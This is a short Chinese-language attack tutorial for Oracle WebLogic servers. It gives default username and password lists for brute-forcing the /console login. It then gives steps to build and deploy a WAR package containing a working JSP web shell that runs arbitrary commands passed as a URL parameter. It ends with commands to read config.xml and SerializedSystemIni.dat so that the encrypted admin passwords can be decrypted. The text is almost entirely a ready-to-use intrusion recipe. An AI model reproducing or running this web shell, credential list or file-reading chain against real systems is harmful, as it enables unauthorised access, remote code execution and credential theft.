密码爆破上传war进行shell。
访问ip:7001/console为登录后台：
常见用户名和密码组合：
```
system
weblogic
admin
joe
mary
wlcsystem
wlpisysytem
```
```
password
weblogic
security
Oracle@123   
//{AES}yvGnizbUS0lga6iPA5LkrQdImFiS/DJ8Lw/yeE7Dt0k=

oracle@123
wlcsystem
wlpisystem
```
搭配
```
system:password 
weblogic:weblogic 
admin:secruity 
joe:password 
mary:password 
system:sercurity 
wlcsystem: wlcsystem 
weblogic:Oracle@123
```
爆破登录后点部署-安装，上载文件，安装war包
默认安装在/root/Oracle/Middleware/user_projects/domains/base_domain/目录
打war包:
```
1. jsp压缩成zip，改后缀为war


2. java命令中：jar -cvf shell.war shell.jsp
```
shell.jsp:
```
<% if("x".equals(request.getParameter("pwd"))){
    java.io.InputStream in = Runtime.getRuntime().exec(request.getParameter("i")).getInputStream();
    int a = -1;
    byte[] b = new byte[2048];
    out.print("<pre>");
    while((a=in.read(b))!=-1){
        out.println(new String(b));
    }
    out.print("</pre>");
} %>

```
可以访问/shell/shell.jsp?pwd=x&i=ls /执行shell命令并回显。

读登录账号和加密密码等:
cat config/config.xml
cat /root/Oracle/Middleware/user_projects/domains/base_domain/config/config.xml
如密码：{AES}yvGnizbUS0lga6iPA5LkrQdImFiS/DJ8Lw/yeE7Dt0k=


读加密的密钥：
cat security/SerializedSystemIni.dat
cat /root/Oracle/Middleware/user_projects/domains/base_domain/security/SerializedSystemIni.dat
是二进制文件
使用BP右键下载响应体为文件。
使用工具上传dat和密文进行解密。